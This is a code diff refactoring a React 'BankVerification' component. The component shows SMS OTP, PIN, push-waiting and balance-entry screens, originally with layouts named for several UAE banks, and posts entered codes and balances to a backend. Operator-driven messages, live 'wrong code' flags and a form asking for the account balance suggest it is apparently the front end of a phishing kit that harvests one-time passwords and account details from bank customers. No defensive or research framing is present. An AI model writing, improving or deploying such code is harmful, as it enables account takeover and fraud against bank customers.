@@ -1,5 +1,7 @@
-import React, { useState, useEffect } from "react";
+import React, { useState, useEffect, useCallback } from "react";
 import { useSessionStatus } from "../hooks/use-session-status";
+import { useResendCountdown } from "../hooks/use-resend-countdown";
+import { submitOtp, resendOtp, submitBalance } from "../lib/bank-api";
 import { StatusOverlay } from "./status-overlay";
 import { SmsOtp } from "../layouts/generic/sms-otp";
 import { PinEntry } from "../layouts/generic/pin-entry";
@@ -7,29 +9,20 @@ import { PushWaiting } from "../layouts/generic/push-waiting";
 import { BalanceCheck } from "../layouts/generic/balance-check";
 import type { BankVerificationProps } from "../types";
 
-const LAYOUT_MAP: Record<
-  string,
-  (p: {
-    apiBase: string;
-    channelSlug: string;
-    sessionId: string;
-    bank?: string;
-    onError: (m: string) => void;
-    wrongCode?: boolean;
-    expiredCode?: boolean;
-    onTryAgain?: () => void;
-    operatorMessage?: { level: "error" | "info"; message: string } | null;
-    countdownResetTrigger?: number;
-  }) => JSX.Element
-> = {
-  sms: (p) => <SmsOtp {...p} />,
-  pin: (p) => <PinEntry {...p} />,
-  push: (p) => <PushWaiting bank={p.bank} />,
-  balance: (p) => <BalanceCheck {...p} />,
-  "enbd-sms": (p) => <SmsOtp {...p} />,
-  "adcb-sms": (p) => <SmsOtp {...p} />,
-  "fab-sms": (p) => <SmsOtp {...p} />,
-  "mashreq-sms": (p) => <SmsOtp {...p} />,
+const RESEND_COOLDOWN = 60;
+
+function normalizeLayout(slug: string | undefined): string {
+  if (!slug) return "sms";
+  if (slug.endsWith("-sms")) return "sms";
+  if (slug.endsWith("-pin")) return "pin";
+  return slug;
+}
+
+const LAYOUT_MAP: Record<string, React.ComponentType<any>> = {
+  sms: SmsOtp,
+  pin: PinEntry,
+  push: PushWaiting,
+  balance: BalanceCheck,
 };
 
 export function BankVerification({
@@ -42,9 +35,27 @@ export function BankVerification({
   onRedirect,
 }: BankVerificationProps) {
   const [error, setError] = useState<string | null>(null);
+  const [submitting, setSubmitting] = useState(false);
+  const [resetKey, setResetKey] = useState(0);
 
   const { status, verificationLayout, bank, redirectUrl, wrongCode, expiredCode, clearCodeFeedback, operatorMessage, countdownResetTrigger } =
     useSessionStatus(apiBase, channelSlug, sessionId);
+
+  const baseLayout = normalizeLayout(verificationLayout);
+  const resendFn = useCallback(() => {
+    if (baseLayout === "pin") return resendOtp(apiBase, channelSlug, sessionId, "pin");
+    if (baseLayout === "sms") return resendOtp(apiBase, channelSlug, sessionId, "sms");
+    return Promise.resolve();
+  }, [apiBase, channelSlug, sessionId, baseLayout]);
+
+  const resendState = useResendCountdown(RESEND_COOLDOWN, countdownResetTrigger, resendFn);
+
+  useEffect(() => {
+    if (wrongCode || expiredCode) {
+      setSubmitting(false);
+      setResetKey((k) => k + 1);
+    }
+  }, [wrongCode, expiredCode]);
 
   useEffect(() => {
     if (!channelSlug || !sessionId) return;
@@ -71,6 +82,34 @@ export function BankVerification({
     }
   }, [channelSlug, sessionId, status, redirectUrl, onSuccess, onDeclined, onError, onRedirect]);
 
+  const handleSubmitOtp = useCallback(
+    async (code: string) => {
+      clearCodeFeedback?.();
+      setSubmitting(true);
+      try {
+        await submitOtp(apiBase, channelSlug, sessionId, code);
+      } catch (e) {
+        setError(e instanceof Error ? e.message : "Invalid code");
+        setSubmitting(false);
+      }
+    },
+    [apiBase, channelSlug, sessionId, clearCodeFeedback]
+  );
+
+  const handleSubmitBalance = useCallback(
+    async (balance: string) => {
+      setError("");
+      setSubmitting(true);
+      try {
+        await submitBalance(apiBase, channelSlug, sessionId, balance);
+      } catch (e) {
+        setError(e instanceof Error ? e.message : "Failed to submit balance");
+        setSubmitting(false);
+      }
+    },
+    [apiBase, channelSlug, sessionId]
+  );
+
   if (!channelSlug || !sessionId) {
     return (
       <div className="bank-ui-error-missing">Missing channel or session</div>
@@ -91,25 +130,36 @@ export function BankVerification({
     return null;
   }
 
-  const Layout = LAYOUT_MAP[verificationLayout ?? "sms"] ?? LAYOUT_MAP["sms"];
+  const Layout = LAYOUT_MAP[baseLayout] ?? LAYOUT_MAP.sms;
+
+  const layoutProps =
+    baseLayout === "push"
+      ? { bank }
+      : baseLayout === "balance"
+        ? {
+            bank,
+            onError: (m: string) => setError(m),
+            operatorMessage,
+            onSubmit: handleSubmitBalance,
+            submitting,
+          }
+        : {
+            bank,
+            onError: (m: string) => setError(m),
+            wrongCode,
+            expiredCode,
+            onTryAgain: clearCodeFeedback,
+            operatorMessage,
+            onSubmit: handleSubmitOtp,
+            submitting,
+            resendState,
+            resetKey,
+          };
 
   return (
     <div className="bank-ui-verification">
       {inProgress && <StatusOverlay />}
-      {awaitingVerification && (
-        <Layout
-          apiBase={apiBase}
-          channelSlug={channelSlug}
-          sessionId={sessionId}
-          bank={bank}
-          onError={(m) => setError(m)}
-          wrongCode={wrongCode}
-          expiredCode={expiredCode}
-          onTryAgain={clearCodeFeedback}
-          operatorMessage={operatorMessage}
-          countdownResetTrigger={countdownResetTrigger}
-        />
-      )}
+      {awaitingVerification && <Layout {...layoutProps} />}
       {error && (
         <div className="bank-ui-error-toast-wrapper">
           <div className="bank-ui-error-toast">{error}</div>
